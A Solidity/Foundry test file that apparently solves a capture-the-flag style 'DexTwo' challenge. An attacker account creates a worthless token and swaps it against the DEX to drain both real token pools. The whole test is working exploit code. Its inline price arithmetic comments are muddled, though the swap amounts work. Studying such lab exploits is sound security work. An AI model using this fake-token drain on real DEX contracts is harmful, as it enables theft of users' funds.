// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Create a malicious token
contract MaliciousToken is ERC20 {
    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000);
    }
}

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletoken1;
    SwappableTokenTwo public swappabletoken2;
    MaliciousToken public maliciousToken;
    
    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dexTwo = new DexTwo();
        swappabletoken1 = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dexTwo.setTokens(address(swappabletoken1), address(swappabletoken2));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletoken1), 100);
        dexTwo.add_liquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        // Set up the attacker with some initial balance
        swappabletoken1.transfer(attacker, 10);
        swappabletoken2.transfer(attacker, 10);

        //DO_NOT_TOUCH
    }

    function test_Exploit_DexTwo() public {

        // Execute the attack as the attacker
        vm.startPrank(attacker);
        
        // Create malicious token
        maliciousToken = new MaliciousToken();
        
        // Add a small amount of malicious token to the DEX
        // This is to establish a price ratio
        maliciousToken.approve(address(dexTwo), type(uint256).max);
        swappabletoken1.approve(address(dexTwo), type(uint256).max);
        swappabletoken2.approve(address(dexTwo), type(uint256).max);
        
        // Add 1 malicious token to the DEX
        maliciousToken.transfer(address(dexTwo), 1);
        
        // Calculate how many malicious tokens needed to drain token1
        // Formula: (mal_amount * token1_balance) / mal_balance = token1_to_receive
        // We want token1_to_receive = 100, mal_balance = 1
        // So mal_amount = 100 * 1 / 100 = 1
        dexTwo.swap(address(maliciousToken), address(swappabletoken1), 1);
        
        // Same calculation for token2
        // We need to drain 100 token2 with mal_balance = 1
        dexTwo.swap(address(maliciousToken), address(swappabletoken2), 2);
        
        vm.stopPrank();

        is_Drained();
    }

    function is_Drained () internal view{
        require(swappabletoken1.balanceOf(address(dexTwo)) == 0);
        require(swappabletoken2.balanceOf(address(dexTwo)) == 0);
    }
}

